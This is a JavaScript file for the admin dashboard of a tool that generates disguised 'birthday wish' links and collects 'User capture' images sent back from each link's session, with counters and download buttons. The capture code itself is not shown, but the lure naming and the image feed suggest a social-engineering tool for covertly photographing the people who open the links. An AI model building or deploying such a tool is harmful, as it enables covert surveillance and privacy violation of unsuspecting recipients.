const statusEl = document.getElementById('status');
const feed = document.getElementById('feed');
const generateLinkBtn = document.getElementById('generateLinkBtn');
const sessionNameInput = document.getElementById('sessionName');
const linkDisplay = document.getElementById('linkDisplay');
const generatedLink = document.getElementById('generatedLink');
const copyLinkBtn = document.getElementById('copyLinkBtn');
const activeSessionsCount = document.getElementById('activeSessionsCount');
const totalImagesCount = document.getElementById('totalImagesCount');
const connectedUsersCount = document.getElementById('connectedUsersCount');

let ws = null;
let totalImages = 0;
let activeSessions = new Set();
let connectedUsers = 0;

function connectWebSocket() {
  ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host);
  
  ws.addEventListener('open', () => {
    statusEl.textContent = 'Connected to server';
    statusEl.className = 'status connected';
    ws.send(JSON.stringify({ type: 'register', role: 'admin' }));
  });

  ws.addEventListener('message', (ev) => {
    try {
      const data = JSON.parse(ev.data);
      
      if (data.type === 'image') {
        handleNewImage(data);
      } else if (data.type === 'stats') {
        updateStats(data);
      } else if (data.type === 'user_connected') {
        connectedUsers++;
        updateStatsDisplay();
      } else if (data.type === 'user_disconnected') {
        connectedUsers = Math.max(0, connectedUsers - 1);
        updateStatsDisplay();
      }
    } catch (e) {
      console.error('Failed to parse message:', e);
    }
  });

  ws.addEventListener('close', () => {
    statusEl.textContent = 'Disconnected from server';
    statusEl.className = 'status disconnected';
    setTimeout(connectWebSocket, 3000);
  });

  ws.addEventListener('error', () => {
    statusEl.textContent = 'Connection error';
    statusEl.className = 'status disconnected';
  });
}

function handleNewImage(data) {
  const imageCard = document.createElement('div');
  imageCard.className = 'image-card';
  
  const img = document.createElement('img');
  img.src = data.payload;
  img.alt = 'User capture';
  
  const meta = document.createElement('div');
  meta.className = 'image-meta';
  
  const userDiv = document.createElement('div');
  userDiv.className = 'user';
  userDiv.textContent = `Session: ${data.sessionId || 'Unknown'}`;
  
  const timeDiv = document.createElement('div');
  timeDiv.className = 'time';
  timeDiv.textContent = new Date(data.time).toLocaleString();
  
  const downloadBtn = document.createElement('button');
  downloadBtn.className = 'btn btn-secondary btn-small';
  downloadBtn.textContent = 'Download';
  downloadBtn.addEventListener('click', () => {
    const a = document.createElement('a');
    a.href = data.payload;
    a.download = `${data.sessionId || 'session'}-${Date.now()}.png`;
    document.body.appendChild(a);
    a.click();
    a.remove();
  });
  
  meta.appendChild(userDiv);
  meta.appendChild(timeDiv);
  meta.appendChild(downloadBtn);
  
  imageCard.appendChild(img);
  imageCard.appendChild(meta);
  
  feed.prepend(imageCard);
  
  // Update stats
  totalImages++;
  if (data.sessionId) {
    activeSessions.add(data.sessionId);
  }
  updateStatsDisplay();
}

function updateStats(data) {
  if (data.totalImages !== undefined) totalImages = data.totalImages;
  if (data.activeSessions !== undefined) activeSessions = new Set(data.activeSessions);
  if (data.connectedUsers !== undefined) connectedUsers = data.connectedUsers;
  updateStatsDisplay();
}

function updateStatsDisplay() {
  activeSessionsCount.textContent = activeSessions.size;
  totalImagesCount.textContent = totalImages;
  connectedUsersCount.textContent = connectedUsers;
}

function generateSessionId() {
  // Generate a short, professional 6-character code (like BW4K9P)
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < 6; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

generateLinkBtn.addEventListener('click', () => {
  const sessionName = sessionNameInput.value.trim() || 'Birthday Celebration';
  const sessionId = generateSessionId();
  const baseUrl = location.protocol + '//' + location.host;
  const link = `${baseUrl}/wish/${sessionId}`;
  
  generatedLink.textContent = link;
  linkDisplay.style.display = 'block';
  
  // Clear the session name input for next use
  sessionNameInput.value = '';
  
  // Send session creation to server
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({
      type: 'create_session',
      sessionId: sessionId,
      sessionName: sessionName
    }));
  }
});

copyLinkBtn.addEventListener('click', async () => {
  try {
    await navigator.clipboard.writeText(generatedLink.textContent);
    copyLinkBtn.textContent = 'Copied!';
    setTimeout(() => {
      copyLinkBtn.textContent = 'Copy Link';
    }, 2000);
  } catch (err) {
    // Fallback for older browsers
    const textArea = document.createElement('textarea');
    textArea.value = generatedLink.textContent;
    document.body.appendChild(textArea);
    textArea.select();
    document.execCommand('copy');
    document.body.removeChild(textArea);
    copyLinkBtn.textContent = 'Copied!';
    setTimeout(() => {
      copyLinkBtn.textContent = 'Copy Link';
    }, 2000);
  }
});

// Initialize connection
connectWebSocket();
